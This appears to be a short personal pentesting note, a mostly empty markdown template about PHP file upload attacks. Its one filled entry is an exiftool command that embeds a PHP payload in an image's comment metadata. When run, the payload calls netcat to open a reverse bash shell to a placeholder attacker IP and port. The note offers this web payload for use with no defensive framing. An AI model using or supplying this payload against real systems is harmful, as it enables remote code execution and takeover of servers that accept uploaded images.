# File Upload
Tags: #php 
Related to:
See also:
Previous:

## Links
Title:
Link:
About:

## Notes
### RCE in image metadata
 `exiftool -Comment='<?php system("nc <IP> <Port> -e /bin/bash"); ?>' image.png`